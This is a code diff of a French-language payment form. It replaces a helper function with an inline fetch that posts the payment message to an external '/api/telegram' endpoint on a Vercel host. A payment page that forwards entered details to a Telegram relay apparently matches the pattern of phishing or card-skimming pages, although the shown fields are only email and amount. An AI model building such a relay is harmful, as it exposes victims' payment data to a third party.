@@ -219,38 +219,6 @@
             loading.style.display = disabled ? 'block' : 'none';
         }
         
-        // Fonction pour envoyer le paiement
-        async function sendPayment(paymentData) {
-            try {
-                console.log('📤 Envoi du paiement:', paymentData);
-                
-                const response = await fetch('https://test-alpha-lac-68.vercel.app/api/telegram', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        message: paymentData.message,
-                        type: 'payment'
-                    })
-                });
-                
-                console.log('📨 Réponse reçue:', response.status);
-                
-                if (!response.ok) {
-                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-                }
-                
-                const result = await response.json();
-                console.log('📋 Résultat:', result);
-                
-                return result;
-                
-            } catch (error) {
-                console.error('❌ Erreur envoi:', error);
-                throw error;
-            }
-        }
         
         // Mise à jour automatique du montant dans le bouton
         document.getElementById('amount').addEventListener('input', function(e) {
@@ -286,11 +254,23 @@
 💶 Montant: ${amount}€
 🔒 Vérifiez immédiatement !`;
                 
-                // Simuler un délai
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                console.log('📨 Message créé:', message);
                 
-                // Envoyer le paiement
-                const result = await sendPayment({ message });
+                // Envoyer directement à l'API
+                console.log('📡 Envoi vers API...');
+                const response = await fetch('https://test-alpha-lac-68.vercel.app/api/telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        message: message,
+                        type: 'payment'
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('✅ Réponse API:', result);
                 
                 if (result.success) {
                     showMessage(`
@@ -299,11 +279,14 @@
                         <p><strong>Email :</strong> ${email}</p>
                         <p><strong>Montant :</strong> ${amount}€</p>
                         <p><strong>Message ID :</strong> ${result.telegramResponse?.result?.message_id}</p>
-                        <p>📱 Notification envoyée sur Telegram !</p>
-                        <p>✅ Vérifiez votre chat Telegram</p>
+                        <p>📱 Vérifiez votre Telegram !</p>
                     `, 'success');
+                    
+                    // Réinitialiser le formulaire
+                    form.reset();
+                    payButton.textContent = '💳 Payer 99.99€';
                 } else {
-                    throw new Error(result.error || 'Erreur inconnue');
+                    showMessage(`❌ Erreur: ${result.error}`, 'error');
                 }
                 
             } catch (error) {
@@ -314,8 +297,7 @@
                     <p>Veuillez réessayer ou contacter le support.</p>
                 `, 'error');
             } finally {
-                // Réactiver le bouton
-                setButtonState(false, `💳 Payer ${amount}€`);
+                setButtonState(false, '💳 Payer 99.99€');
             }
         });
         
